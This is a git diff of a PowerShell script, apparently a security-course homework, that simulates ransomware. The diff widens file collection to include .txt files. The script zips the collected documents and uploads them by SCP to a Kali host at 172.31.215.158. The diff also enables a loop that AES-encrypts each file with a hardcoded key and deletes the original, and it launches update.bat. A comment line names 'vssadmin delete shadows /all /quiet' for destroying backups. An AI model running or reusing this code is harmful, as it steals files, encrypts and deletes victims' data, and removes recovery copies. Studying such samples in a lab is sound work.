@@ -94,7 +94,7 @@ function Invoke-AESEncryption {
 }
 
 # Grab file contents and export to CSV. 
-Get-ChildItem -Recurse -include *.docx, *.pdf, *.xlsx -Path D:\Sec320\SYS-320\Week13\homework\Documents\Documents | Export-Csv 'D:\Sec320\SYS-320\Week13\homework\targets.csv'
+Get-ChildItem -Recurse -include *.docx, *.pdf, *.xlsx, *.txt -Path D:\Sec320\SYS-320\Week13\homework\Documents | Export-Csv 'D:\Sec320\SYS-320\Week13\homework\targets.csv'
 
 # Import csv file
 $filelist = import-csv -Path ".\Week13\homework\targets.csv" -header FullName
@@ -111,11 +111,14 @@ Compress-Archive -Path ".\Week13\homework\extract" -DestinationPath ".\Week13\ho
 Set-SCPItem -ComputerName '172.31.215.158' -Credential (Get-Credential kali) -Path 'D:\Sec320\SYS-320\Week13\homework\extract.zip' -Destination '/home/kali/'
 
 # Loop results and encrypt files. 
-#foreach($f in $filelist){
+foreach($f in $filelist){
 
-#    Invoke-AESEncryption -Mode Encrypt -Key "G3tPWn3d!" -Path $f.FullName
-#    Remove-Item $f.FullName
+    Invoke-AESEncryption -Mode Encrypt -Key "G3tPWn3d!" -Path $f.FullName
+    Remove-Item $f.FullName
 
-#}
+}
 
-#Start-Process .\update.bat
+# Again, I am not comfortable running these commands on my home system. 
+# Write-Host "vssadmin delete shadows /all /quiet"
+
+Start-Process .\Week13\homework\update.bat
